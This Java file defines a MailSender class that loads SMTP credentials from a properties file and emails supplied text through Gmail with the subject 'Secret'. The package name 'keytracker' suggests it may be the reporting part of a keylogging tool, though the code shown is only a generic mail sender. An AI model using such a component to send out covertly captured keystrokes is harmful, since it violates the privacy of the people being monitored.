package com.keytracker.mail;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.io.IOException;
import java.io.InputStream;
import java.util.Properties;

public class MailSender {

    private final Properties properties;
    private String from;
    private String password;

    public MailSender() {
        this.properties = new Properties();
        loadProperties();
        this.from = this.properties.getProperty("mail.smtp.user");
        this.password = this.properties.getProperty("mail.smtp.password");
    }

    public void send(String text, String to) {
//        Properties props = new Properties();
//        props.put("mail.smtp.host", "smtp.gmail.com");
//        props.put("mail.smtp.socketFactory.port", "465");
//        props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
//        props.put("mail.smtp.auth", "true");
//        props.put("mail.smtp.port", "465");

        Session session = Session.getDefaultInstance(this.properties, new GMailAuthenticator(from, password));

        try {
            Message message = new MimeMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
            message.setSubject("Secret");
            message.setText(text);

            Transport.send(message);
        } catch (MessagingException e) {
            throw new RuntimeException(e);
        }
    }

    private void loadProperties() {
        try (InputStream resourceStream = getClass().getClassLoader().getResourceAsStream("mail.properties")) {
            this.properties.load(resourceStream);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}